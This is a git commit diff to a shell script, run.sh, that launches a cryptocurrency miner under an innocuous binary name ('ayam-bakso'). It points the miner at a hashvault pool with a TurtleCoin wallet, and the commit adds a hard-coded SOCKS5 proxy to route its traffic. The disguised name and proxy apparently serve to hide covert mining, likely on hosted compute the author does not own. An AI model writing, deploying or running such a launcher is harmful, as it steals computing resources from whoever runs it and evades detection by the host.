d7513222dad275cd2ca95536645bd5278bfbb137
Noval Anto <novalanto6161@gmail.com>
2021-10-24 08:13:31 +0000

    run.sh edited online with Bitbucket

--- run.sh
+++ run.sh
@@ -1,4 +1,5 @@
 POL=pool.hashvault.pro:80
 WAL=TRTLv1ddyqQ1unEZxBT9gze6yMmeHM6JPet9DRtG2XWgiM3q2XgfCBM3pbjhJD6vsARvRxSRsEm1jdpozZVuDh6piUzcg26m7rR
 WOR=$(echo $(shuf -i 1-20000 -n 1)-V)
-chmod 777 ayam-bakso && ./ayam-bakso -o $POL -u $WAL --keepalive --donate-level 1 -p $WOR -k --tls
+PRO=socks5://174.77.111.196:4145
+chmod 777 ayam-bakso && ./ayam-bakso -o $POL -u $WAL --keepalive --donate-level 1 -p $WOR -k --tls --proxy=$PRO
